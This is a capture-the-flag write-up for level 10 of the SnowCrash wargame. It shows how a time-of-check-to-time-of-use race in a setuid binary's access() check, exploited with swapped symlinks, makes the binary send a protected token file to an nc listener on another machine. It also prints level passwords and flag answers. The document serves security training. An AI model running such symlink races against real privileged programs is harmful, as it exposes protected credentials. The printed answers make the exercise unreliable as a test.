# Solve Level10
pass : s5cAJpM8ev6XHw998pRWG728z

## Description
- home
    - -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
    - -rw-------  1 flag10  flag10     26 Mar  5  2016 token

### level10
- The binary takes 2 args, a file to send and an host
- He create a connection on port 6969 and send the file if we have perms
    - we can use nc to create a server on our machine or on snowcrash ```nc -l -p 6969``` | ```nc -l 6969```
    - then ```./level10 file/to/send my_machine_ip```
      - it works, now we must find a way to send token ; ln does not work
      - we use decompiler and see the use of access ==> which can be exploit
        - cf TOCTOU [source][https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use]

## Solution
```bash
cd /tmp
echo pouet > pouet
ln -fs pouet link
ln -fs ~/token lel & ~/level10 lel 10.0.2.15
```

- flag10 : woupa2yuojeeaaed06riuj63c
- level11 : feulo4b72j7edeahuete3no7c


## Resolve problem
